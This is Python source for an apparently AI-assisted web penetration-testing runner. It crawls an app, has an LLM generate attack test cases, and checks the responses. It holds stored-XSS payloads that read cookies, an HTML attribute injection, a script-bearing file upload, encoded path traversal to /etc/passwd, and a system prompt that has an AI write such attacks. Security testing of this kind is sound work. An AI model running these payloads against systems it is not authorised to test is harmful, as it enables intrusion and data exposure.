"""Smart Web Probe — AI-driven vulnerability testing.

Instead of hardcoding specific tests for stored XSS, XSSI, path traversal etc.,
this runner:
1. Collects the app's HTML (forms, endpoints, parameters, cookies)
2. Sends the context + previous findings to Claude API
3. Claude generates specific HTTP test cases to try
4. The runner executes each test case and checks for vulnerabilities
5. Returns findings + next_step_hints for the exploitation chain

This replaces dozens of hardcoded vulnerability-specific runners with one
intelligent runner that adapts to any web application.
"""
from __future__ import annotations

import json
import logging
import os
import re
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx as httpx_client

from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
from workers.runners.httpx.runner import normalize_http_target

logger = logging.getLogger(__name__)

SMART_PROBE_RESULTS_ARTIFACT_NAME = "smart-web-probe-results.json"

AI_SYSTEM_PROMPT = """You are a web application security tester. Generate HTTP test cases for vulnerabilities.

Return ONLY a JSON array. Each test case MUST have:
{
  "name": "short name",
  "vuln_type": "stored_xss|xssi|path_traversal|csrf|idor|privilege_escalation|info_disclosure",
  "method": "GET|POST|POST_MULTIPART",
  "url": "EXACT full URL from the HTML (resolve relative URLs!)",
  "params": {"key": "value"},
  "data": {"key": "value"},
  "cookies": {"name": "value"},
  "check": "LITERAL STRING that must appear in the response to confirm vulnerability — NOT a description",
  "verify_url": "URL to check AFTER the test request (for stored vulnerabilities)",
  "filename": "filename.html",
  "severity": "critical|high|medium|low"
}

CRITICAL RULES for 'check' field:
- Must be a literal string that will appear in the HTTP response body
- For XSS payload '<script>alert(\"aegispt\")</script>': check = 'aegispt'
- For path traversal: check = 'root:x:0' or 'daemon:' (from /etc/passwd)
- For JSONP: check = '_feed(' or the callback function name
- For IDOR showing other user's data: check = username of other user (e.g. 'cheddar')
- NEVER use descriptions like 'Response contains...' — only literal search strings

CRITICAL RULES for URL:
- Use the exact 'action' attribute from <form> tags
- Resolve relative URLs: '/123/newsnippet2' -> 'https://host/123/newsnippet2'

Example of CORRECT test case:
{
  "name": "Stored XSS via snippet form",
  "vuln_type": "stored_xss",
  "method": "GET",
  "url": "https://google-gruyere.appspot.com/123456/newsnippet2",
  "params": {"snippet": "<script>alert('aegispt-stored')</script>", "private": ""},
  "data": {},
  "cookies": {"GRUYERE": "hash|user||author"},
  "check": "aegispt-stored",
  "verify_url": "https://google-gruyere.appspot.com/123456/snippets.gtl",
  "severity": "high"
}

Maximum 8 test cases. Return [] if nothing clear to test."""


def _collect_app_context(
    client: httpx_client.Client,
    base_url: str,
    session_cookie: dict[str, str] | None = None,
) -> dict[str, Any]:
    """Fetch key pages and extract forms, endpoints, links, cookies."""
    parsed = urlparse(base_url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"
    path_parts = [p for p in parsed.path.strip("/").split("/") if p]
    instance = f"/{path_parts[0]}" if path_parts else ""

    pages_to_fetch = [
        base_url,
        f"{base_origin}{instance}/login",
        f"{base_origin}{instance}/profile.gtl",
        f"{base_origin}{instance}/snippets.gtl",
        f"{base_origin}{instance}/upload.gtl",
        f"{base_origin}{instance}/feed.gtl",
    ]

    context: dict[str, Any] = {
        "base_url": base_url,
        "pages": [],
        "all_forms": [],
        "all_links": [],
        "cookies_set": [],
        "json_endpoints": [],
    }

    for url in pages_to_fetch:
        try:
            resp = client.get(url, cookies=session_cookie or {})
            if resp.status_code >= 400:
                continue
            html = resp.text[:8000]  # limit size

            # Extract forms
            for form_m in re.finditer(r'<form([^>]*)>(.*?)</form>', html, re.DOTALL | re.IGNORECASE):
                attrs = form_m.group(1)
                body = form_m.group(2)
                action_m = re.search(r'action=["\']([^"\']*)["\']', attrs, re.IGNORECASE)
                method_m = re.search(r'method=["\']([^"\']*)["\']', attrs, re.IGNORECASE)
                fields = re.findall(r'name=["\']([^"\']*)["\']', body, re.IGNORECASE)
                action = action_m.group(1) if action_m else url
                full_action = urljoin(base_origin, action) if not action.startswith("http") else action
                context["all_forms"].append({
                    "page": url,
                    "action": full_action,
                    "method": (method_m.group(1) if method_m else "post").upper(),
                    "fields": fields,
                })

            # Extract links
            links = re.findall(r'href=["\']([^"\'#][^"\']*)["\']', html, re.IGNORECASE)
            for link in links[:10]:
                full = urljoin(base_origin, link) if not link.startswith("http") else link
                if full.startswith(base_origin):
                    context["all_links"].append(full)

            # Check if JSON/JSONP
            ct = resp.headers.get("content-type", "")
            text_start = resp.text.strip()[:100]
            if "json" in ct or text_start.startswith("{") or text_start.startswith("[") or re.match(r'^[a-zA-Z_]\w*\s*\(', text_start):
                context["json_endpoints"].append({
                    "url": url,
                    "content_type": ct,
                    "preview": text_start,
                    "is_jsonp": bool(re.match(r'^[a-zA-Z_]\w*\s*\(', text_start)),
                })

            # Check Set-Cookie headers
            sc = resp.headers.get("set-cookie", "")
            if sc:
                httponly = "httponly" in sc.lower()
                context["cookies_set"].append({"url": url, "header": sc[:200], "httponly": httponly})

            context["pages"].append({
                "url": url,
                "status": resp.status_code,
                "html_excerpt": html[:1000],
            })
        except httpx_client.HTTPError:
            continue

    return context


def _ask_via_aegispt_api(
    context: dict[str, Any],
    previous_findings: list[dict[str, Any]],
    session_cookie: dict[str, str] | None = None,
    engagement_id: str | None = None,
) -> list[dict[str, Any]] | None:
    """Call the AegisPT local API which proxies to ChatGPT OAuth.

    This uses the existing ChatGPT connection the user already set up —
    no separate API key needed. Returns None if unavailable.
    """
    if not engagement_id:
        return None
    api_base = os.environ.get("APP_PUBLIC_BASE_URL", "http://127.0.0.1:8000").rstrip("/")
    try:
        resp = httpx_client.post(
            f"{api_base}/api/v1/ai/research/web-probe-suggest",
            json={
                "engagement_id": engagement_id,
                "app_context": context,
                "previous_findings": previous_findings or [],
                "session_cookie": session_cookie,
            },
            timeout=30.0,
        )
        if resp.status_code == 200:
            data = resp.json()
            cases = data.get("test_cases") or []
            if cases:
                logger.debug("web-probe-suggest: %d cases from %s", len(cases), data.get("provider"))
                return cases
    except Exception as exc:
        logger.debug("AegisPT API probe suggest failed: %s", exc)
    return None


def _ask_claude_for_test_cases(
    context: dict[str, Any],
    previous_findings: list[dict[str, Any]],
    session_cookie: dict[str, str] | None = None,
    engagement_id: str | None = None,
) -> list[dict[str, Any]]:
    """Generate test cases: try ChatGPT OAuth first, then Anthropic API, then heuristics."""
    # 1. Try existing ChatGPT OAuth via AegisPT API (no extra API key needed)
    cases = _ask_via_aegispt_api(context, previous_findings, session_cookie, engagement_id)
    if cases:
        return cases

    # 2. Try Anthropic API directly if key is configured
    api_key = os.environ.get("ANTHROPIC_API_KEY", "").strip()
    if not api_key:
        logger.debug("No AI available; using heuristic test cases")
        return _heuristic_test_cases(context, session_cookie)

    try:
        import anthropic

        client = anthropic.Anthropic(api_key=api_key)

        # Build prompt with app context
        prompt_parts = [
            f"Target: {context['base_url']}",
            f"\nForms found ({len(context['all_forms'])}):",
        ]
        for form in context["all_forms"][:8]:
            prompt_parts.append(f"  {form['method']} {form['action']} fields={form['fields']}")

        prompt_parts.append(f"\nJSON/JSONP endpoints ({len(context['json_endpoints'])}):")
        for ep in context["json_endpoints"]:
            prompt_parts.append(f"  {ep['url']}: {ep['preview'][:100]} (jsonp={ep['is_jsonp']})")

        prompt_parts.append(f"\nLinks found: {context['all_links'][:10]}")

        if previous_findings:
            prompt_parts.append(f"\nAlready found: {[f.get('title','?') for f in previous_findings[:5]]}")

        if session_cookie:
            prompt_parts.append(f"\nAuthenticated session available: cookies={list(session_cookie.keys())}")

        msg = client.messages.create(
            model="claude-haiku-4-5-20251001",
            max_tokens=2048,
            system=AI_SYSTEM_PROMPT,
            messages=[{"role": "user", "content": "\n".join(prompt_parts)}],
        )
        raw = msg.content[0].text.strip()
        json_match = re.search(r"\[.*\]", raw, re.DOTALL)
        if json_match:
            cases = json.loads(json_match.group(0))
            return cases if isinstance(cases, list) else []
    except Exception as exc:
        logger.debug("Claude API call failed: %s — falling back to heuristics", exc)

    return _heuristic_test_cases(context, session_cookie)


def _heuristic_test_cases(
    context: dict[str, Any],
    session_cookie: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    """Fallback: generate test cases from known vulnerability patterns without AI.

    Covers: stored XSS via forms, XSSI via JSONP endpoints, path traversal,
    and other common web vulnerabilities — using the app's actual endpoints.
    """
    cases: list[dict[str, Any]] = []
    base_url = context["base_url"]
    parsed = urlparse(base_url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"
    path_parts = [p for p in parsed.path.strip("/").split("/") if p]
    instance = f"/{path_parts[0]}" if path_parts else ""

    # Stored XSS: inject into text fields that get rendered back
    xss_payload = "<script>alert('aegispt-stored-xss-'+document.cookie)</script>"
    for form in context["all_forms"]:
        text_fields = [f for f in form["fields"] if f.lower() not in ("submit", "action", "private", "is_author", "is_admin")]
        if not text_fields:
            continue
        if any(kw in form["action"].lower() for kw in ("snippet", "comment", "post", "message", "content", "profile")):
            test_data = {field: xss_payload for field in text_fields[:2]}
            if form["method"] == "GET":
                cases.append({
                    "name": f"Stored XSS via {form['action'].split('/')[-1]}",
                    "vuln_type": "stored_xss",
                    "method": "GET",
                    "url": form["action"],
                    "params": {**test_data, "private": ""},
                    "data": {},
                    "cookies": session_cookie or {},
                    "check": "aegispt-stored-xss",
                    "severity": "high",
                    "verify_url": f"{base_origin}{instance}/snippets.gtl",
                })
            else:
                cases.append({
                    "name": f"Stored XSS via {form['action'].split('/')[-1]}",
                    "vuln_type": "stored_xss",
                    "method": "POST",
                    "url": form["action"],
                    "params": {},
                    "data": test_data,
                    "cookies": session_cookie or {},
                    "check": "aegispt-stored-xss",
                    "severity": "high",
                    "verify_url": f"{base_origin}{instance}/snippets.gtl",
                })

    # XSSI: check discovered JSON/JSONP endpoints
    for ep in context["json_endpoints"]:
        if ep.get("is_jsonp"):
            cases.append({
                "name": f"XSSI via {ep['url'].split('/')[-1]}",
                "vuln_type": "xssi",
                "method": "GET",
                "url": ep["url"],
                "params": {},
                "data": {},
                "cookies": session_cookie or {},
                "check": "JSONP callback with sensitive data",
                "severity": "medium",
            })

    # Path traversal: try URL-encoded traversal on known endpoints
    traversal_payloads = [
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    for payload in traversal_payloads[:2]:
        cases.append({
            "name": "Path Traversal - /etc/passwd",
            "vuln_type": "path_traversal",
            "method": "GET",
            "url": f"{base_origin}{instance}/{payload}",
            "params": {},
            "data": {},
            "cookies": session_cookie or {},
            "check": "root:|daemon:|/bin/",
            "severity": "high",
        })

    # Profile color field - HTML attribute injection
    if session_cookie and any("saveprofile" in f["action"].lower() for f in context["all_forms"]):
        cases.append({
            "name": "HTML Attribute Injection via profile color field",
            "vuln_type": "stored_xss",
            "method": "GET",
            "url": f"{base_origin}{instance}/saveprofile",
            "params": {"action": "update", "color": "red\" onmouseover=\"alert(document.cookie)"},
            "data": {},
            "cookies": session_cookie or {},
            "check": "onmouseover",
            "severity": "high",
            "verify_url": f"{base_origin}{instance}/profile.gtl",
        })

    # File upload XSS
    for form in context["all_forms"]:
        if "upload" in form["action"].lower() or any("file" in f.lower() for f in form["fields"]):
            cases.append({
                "name": "File Upload XSS",
                "vuln_type": "stored_xss",
                "method": "POST_MULTIPART",
                "url": form["action"],
                "params": {},
                "data": {"upload_file": "<script>alert('aegispt-upload-xss')</script>"},
                "filename": "aegispt.html",
                "cookies": session_cookie or {},
                "check": "aegispt-upload-xss",
                "severity": "high",
            })

    return cases[:10]


def _execute_test_case(
    client: httpx_client.Client,
    test: dict[str, Any],
    base_url: str,
) -> dict[str, Any]:
    """Execute one test case and return result with finding if vulnerable."""
    method = test.get("method", "GET").upper()
    url = test.get("url", "")
    params = test.get("params") or {}
    data = test.get("data") or {}
    cookies = test.get("cookies") or {}
    check = str(test.get("check") or "")
    verify_url = test.get("verify_url", "")

    if not url:
        return {"test": test["name"], "skipped": True}

    try:
        if method == "GET":
            resp = client.get(url, params=params, cookies=cookies)
        elif method == "POST_MULTIPART":
            filename = test.get("filename", "test.html")
            file_content = str(list(data.values())[0] if data else "").encode()
            field_name = list(data.keys())[0] if data else "file"
            resp = client.post(url, files={field_name: (filename, file_content, "text/html")}, cookies=cookies)
        else:
            resp = client.post(url, data=data, params=params, cookies=cookies)

        body = resp.text or ""
        check_patterns = [p.strip() for p in check.split("|") if p.strip()]

        # Check primary URL
        primary_hit = any(p in body for p in check_patterns)

        # Check verify_url (for stored XSS — the payload appears on another page)
        verify_hit = False
        verify_body = ""
        if verify_url and not primary_hit:
            try:
                vresp = client.get(verify_url, cookies=cookies)
                verify_body = vresp.text or ""
                verify_hit = any(p in verify_body for p in check_patterns)
            except httpx_client.HTTPError:
                pass

        is_vulnerable = primary_hit or verify_hit

        result: dict[str, Any] = {
            "test": test["name"],
            "vuln_type": test.get("vuln_type", "unknown"),
            "url": url,
            "method": method,
            "status_code": resp.status_code,
            "vulnerable": is_vulnerable,
            "check": check,
            "found_in": "primary" if primary_hit else ("verify_url" if verify_hit else "none"),
            "severity": test.get("severity", "medium"),
        }

        if is_vulnerable:
            context_body = verify_body if verify_hit else body
            idx = next((context_body.find(p) for p in check_patterns if p in context_body), -1)
            result["evidence_excerpt"] = context_body[max(0, idx - 50):idx + 150] if idx >= 0 else body[:200]

        return result

    except httpx_client.HTTPError as exc:
        return {"test": test["name"], "error": str(exc), "vulnerable": False}


def execute_smart_web_probe(
    targets: list[str],
    *,
    session_cookie: dict[str, str] | None = None,
    previous_findings: list[dict[str, Any]] | None = None,
    engagement_id: str | None = None,
    timeout_seconds: float = 30.0,
) -> RunnerExecution:
    """AI-driven web vulnerability probe.

    Uses ChatGPT OAuth (via AegisPT API) or Anthropic API to generate test cases.
    Falls back to heuristic patterns if no AI is available.
    """
    if not targets:
        raise ValueError("at least one target is required")

    base_target = normalize_http_target(targets[0])
    findings: list[dict[str, Any]] = []
    results: list[dict[str, Any]] = []

    with httpx_client.Client(follow_redirects=True, timeout=timeout_seconds) as client:
        # Step 1: collect app context
        app_context = _collect_app_context(client, base_target, session_cookie)

        # Step 2: AI generates test cases
        # Priority: 1) ChatGPT OAuth via AegisPT API, 2) Anthropic API, 3) heuristics
        test_cases = _ask_claude_for_test_cases(
            app_context,
            previous_findings or [],
            session_cookie,
            engagement_id=engagement_id,
        )

        # Step 3: execute each test case
        for test in test_cases:
            result = _execute_test_case(client, test, base_target)
            results.append(result)

            if result.get("vulnerable"):
                vuln_type = result.get("vuln_type", "unknown")
                sev = result.get("severity", "medium")

                title_map = {
                    "stored_xss": "Stored XSS — Persistent Payload in Application",
                    "xssi": "XSSI — Cross-Site Script Inclusion (JSONP Data Theft)",
                    "path_traversal": "Path Traversal — Sensitive File Disclosure",
                    "csrf": "CSRF — Cross-Site Request Forgery",
                    "idor": "IDOR — Insecure Direct Object Reference",
                    "privilege_escalation": "Privilege Escalation — Elevated Access Obtained",
                    "info_disclosure": "Information Disclosure",
                }
                title = title_map.get(vuln_type, f"Vulnerability: {result['test']}")

                findings.append({
                    "type": vuln_type,
                    "title": title,
                    "severity": sev,
                    "target": result["url"],
                    "summary": (
                        f"{result['test']}: vulnerability confirmed at {result['url']}. "
                        f"Check '{result['check']}' found in {result['found_in']} response."
                    ),
                    "evidence": result,
                })

    result_payload = {
        "tool": "smart-web-probe",
        "targets": [base_target],
        "test_cases_generated": len(test_cases),
        "test_cases_vulnerable": len(findings),
        "results": results,
        "findings": findings,
        "summary": {
            "finding_count": len(findings),
            "critical_count": sum(1 for f in findings if f.get("severity") == "critical"),
            "high_count": sum(1 for f in findings if f.get("severity") == "high"),
            "ai_generated": bool(os.environ.get("ANTHROPIC_API_KEY")),
        },
    }

    return RunnerExecution(
        tool="smart-web-probe",
        exit_code=0,
        stdout=json.dumps(result_payload),
        stderr="",
        metadata={"status": "ok", "tool_version": "smart-web-probe:v1"},
        artifacts=[EvidenceArtifact(
            name=SMART_PROBE_RESULTS_ARTIFACT_NAME,
            content_type="application/json",
            data=(json.dumps(result_payload, sort_keys=True) + "\n").encode("utf-8"),
            kind="runner-results",
        )],
    )
